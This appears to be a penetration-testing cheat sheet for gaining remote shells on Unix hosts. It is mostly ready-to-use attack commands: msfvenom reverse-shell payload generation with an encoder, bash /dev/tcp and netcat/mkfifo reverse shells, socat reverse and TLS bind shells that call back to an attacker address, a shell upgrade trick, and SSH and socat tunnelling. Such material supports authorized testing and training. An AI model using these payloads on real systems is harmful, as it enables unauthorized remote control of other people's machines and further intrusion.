# Unix Remote Code Execution

## MSFvenom

<a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">Reverse Shell Cheat Sheet</a>

<a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet</a>

=== "Shell File"

	``` bash
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
	```

=== "Java Code"

	``` bash
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
	```

=== "Shell Code"

	``` bash
	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "<badchars>"
	```

=== "Encoders"

	``` bash
	msfvenom  --list encoders
	```

## Reverse Shell using bash

``` bash
bash -c '0<&60-;exec 60<>/dev/tcp/<LHOST>/<LPORT>;sh <&60 >&60 2>&60' 2> /dev/null
```

``` bash
bash -c 'sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Netcat Reverse Shell

Kali machine

``` bash
sudo nc -nlvp 443
```

Unix machine

``` bash
nc -nv 192.168.11.130 443 -e cmd.exe
```

``` bash
mkfifo /tmp/p; nc <LHOST> <LPORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```

## Socat Reverse Shell

Kali machine

``` bash
socat -d -d TCP4-LISTEN:443 STDOUT
```

Unix machine

``` bash
socat TCP4:192.168.11.130:443 EXEC:/bin/sh
```

## Socat Encrypted Bind Shell

Create credential

``` bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Unix machine

``` bash
socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/sh
```

Kali machine

``` bash
sudo socat OPENSSL:192.168.11.130:443,verify=0
```

## Upgrade shell

``` bash
/usr/bin/python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

^Z

``` bash
stty raw -echo; fg
```

## <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>

### Local Forwarding

``` bash
ssh -L 127.0.0.1:80:intra.example.com:80 kali@$myip
```

### Remote Forwarding

### ssh

``` bash
ssh -R $myip:8080:127.0.0.1:8080 kali@$myip
```

### socat

Redirect all port 80 conenctions to ip 202.54.1.5

``` bash
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
```